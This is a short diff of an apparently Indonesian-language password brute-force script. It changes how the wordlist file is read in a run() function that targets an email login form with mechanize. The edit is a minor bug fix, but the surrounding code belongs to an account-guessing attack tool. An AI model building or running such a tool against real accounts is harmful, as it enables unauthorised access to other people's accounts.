@@ -71,7 +71,8 @@ def run(email, wordlist, agent, timeout):
 	br.addheaders = [('User-agent', agent)]
 	br.open(url, timeout=timeout)
 	form = br.forms()[0]
-	wordlist = open(wordlist, "rb").readlines()
+	fp = open(wordlist, "rb")
+	wordlist = fp.readlines()
 	print ("\033[01;34m")
 	msg = "target: " + email; logger.info(msg)
 	msg = "wordlist: %d password" % len(wordlist); logger.info(msg)
@@ -91,7 +92,7 @@ def run(email, wordlist, agent, timeout):
 			print ("\033[0m")
 			raise SystemExit
 
-	msg = "password valid tidak ditemukan di wordlist anda: " + wordlist.name; logger.critical(msg)
+	msg = "password valid tidak ditemukan di wordlist anda: " + fp.name; logger.critical(msg)
 
 def main():
 	print (BANNER)
